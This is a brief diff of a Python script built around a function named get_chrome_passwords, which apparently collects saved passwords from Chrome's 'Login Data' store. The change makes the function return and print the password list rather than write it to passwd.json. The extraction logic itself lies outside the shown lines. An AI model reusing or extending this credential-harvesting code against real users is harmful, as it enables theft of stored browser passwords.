@@ -68,7 +68,9 @@ def get_chrome_passwords():
             print(f"Login Data no encontrado en {original_db_path}")
 
     file_name = "passwd.json"
+    return passwd_list
     
-    with open (file_name, "w", encoding="utf-8") as file:
+    '''with open (file_name, "w", encoding="utf-8") as file:
         json.dump(passwd_list, file, indent= 4, ensure_ascii=False)
-    return file_name
+    return file_name'''
+print(get_chrome_passwords())
